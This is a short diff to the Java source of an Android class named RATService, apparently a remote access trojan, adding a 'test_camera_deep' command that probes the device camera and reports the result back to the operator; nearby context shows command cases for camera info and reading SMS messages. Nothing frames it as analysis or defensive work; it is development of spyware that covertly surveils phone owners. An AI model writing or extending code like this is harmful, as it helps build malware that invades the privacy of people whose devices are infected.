@@ -641,6 +641,17 @@ public class RATService extends Service {
                     sendCommand("CAMERA_INFO|ERROR: Camera module not available");
                 }
                 break;
+
+case "test_camera_deep":
+    if (cameraModule != null) {
+        String result = cameraModule.testCamera();
+        sendCommand("CAMERA_DEEP_TEST|" + result);
+    } else {
+        sendCommand("CAMERA_DEEP_TEST|Camera module is NULL");
+    }
+    break;
+
+
                 
             case "sms":
             case "get_sms":
